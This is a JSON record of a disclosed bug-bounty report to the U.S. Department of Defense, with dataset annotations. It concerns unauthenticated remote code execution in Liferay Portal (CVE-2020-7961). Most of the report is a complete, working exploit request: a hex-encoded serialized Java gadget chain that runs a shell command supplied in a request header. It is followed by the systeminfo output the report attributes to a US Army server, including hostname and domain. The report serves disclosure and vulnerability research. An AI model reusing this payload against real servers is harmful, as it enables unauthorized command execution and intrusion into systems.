{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "exploitmsf ",
  "title": "CVE-2020-7961 RCE Liferay Portal Unauthenticated via https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
  "content": "\npoc:\nCode 5.17 KiB\n1POST /api/jsonws/invoke HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0\n4Content-Length: 4939\n5Content-Type: application/x-www-form-urlencoded\n6Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588//api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData\n7cmd2: systeminfo\n8Accept-Encoding: gzip\n9\n10cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=tdmrl&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D\nAttacker can read response from system for command systeminfo\nCode 2.86 KiB\n1Host Name:                 EISEW6ZR84C2002\n2OS Name:                   Microsoft Windows Server 2019 Standard\n3OS Version:                10.0.17763 N/A Build 17763\n4OS Manufacturer:           Microsoft Corporation\n5OS Configuration:          Member Server\n6OS Build Type:             Multiprocessor Free\n7Registered Owner:          US Army user\n8Registered Organization:   US Army\n9Product ID:                00429-70000-00000-AA946\n10Original Install Date:     8/5/2023, 8:02:29 PM\n11System Boot Time:          9/25/2024, 11:45:46 AM\n12System Manufacturer:       Microsoft Corporation\n13System Model:              Virtual Machine\n14System Type:               x64-based PC\n15Processor(s):              1 Processor(s) Installed.\n16                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2195 Mhz\n17BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 12/17/2019\n18Windows Directory:         C:\\WINDOWS\n19System Directory:          C:\\WINDOWS\\system32\n20Boot Device:               \\Device\\HarddiskVolume1\n21System Locale:             en-us;English (United States)\n22Input Locale:              en-us;English (United States)\n23Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)\n24Total Physical Memory:     131,071 MB\n25Available Physical Memory: 123,442 MB\n26Virtual Memory: Max Size:  146,200 MB\n27Virtual Memory: Available: 131,089 MB\n28Virtual Memory: In Use:    15,111 MB\n29Page File Location(s):     C:\\pagefile.sys\n30Domain:                    nase.ds.army.mil\n31Logon Server:              N/A\n32Hotfix(s):                 17 Hotfix(s) Installed.\n33                           [01]: KB5041974\n34                           [02]: KB4470788\n35                           [03]: KB4486153\n36                           [04]: KB4577586\n37                           [05]: KB5005112\n38                           [06]: KB5043050\n39                           [07]: KB5028316\n40                           [08]: KB5030505\n41                           [09]: KB5031589\n42                           [10]: KB5032306\n43                           [11]: KB5034863\n44                           [12]: KB5035963\n45                           [13]: KB5037017\n46                           [14]: KB5039335\n47                           [15]: KB5040563\n48                           [16]: KB5041577\n49                           [17]: KB5043126\n50Network Card(s):           2 NIC(s) Installed.\n51                           [01]: Microsoft Hyper-V Network Adapter\n52                                 Connection Name: Ethernet 13\n53                                 DHCP Enabled:    No\n54                                 IP address(es)\n55                                 [01]: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n56                           [02]: Microsoft Hyper-V Network Adapter\n57                                 Connection Name: Ethernet 14\n58                                 Status:          Hardware not present\n59Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.\n\u2588\u2588\u2588\u2588\u2588\nImpact\nAttacker can execute commands on server\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2020-7961\nSteps to Reproduce\nI write steps in Description\nSuggested Mitigation/Remediation Actions\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1729884360,
  "report_url": "https://hackerone.com/reports/2742457",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to /api/jsonws/invoke with a crafted payload that includes a command to execute (e.g., systeminfo)."
    ],
    [
      2,
      "The crafted payload exploits a deserialization vulnerability in Liferay Portal to execute arbitrary commands on the server."
    ]
  ],
  "vuln_description": "This vulnerability is an unauthenticated remote code execution (RCE) in Liferay Portal via a deserialization flaw. The attacker can send a specially crafted request to the JSONWS API endpoint, which allows them to execute arbitrary commands on the server. The exploit leverages the C3P0 library's deserialization feature to achieve RCE.",
  "reason": "The attack involves a single, straightforward HTTP request with a crafted payload. While the payload itself is complex due to the serialized Java objects, the overall attack flow is simple and does not require multiple steps or understanding of complex application states. The vulnerability is well-documented (CVE-2020-7961), making it easier to discover and exploit.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an unauthenticated remote code execution (RCE) via a deserialization flaw in Liferay Portal. The methodology described focuses on authentication and authorization bypasses (AuthN/AuthZ) and insecure direct object references (IDOR) within the same application context. The RCE exploit does not fit into these categories as it does not involve swapping user sessions or resource IDs to bypass authorization checks. Instead, it exploits a deserialization vulnerability in a specific endpoint, which is a different class of vulnerability.",
    "is_detectable": false
  }
}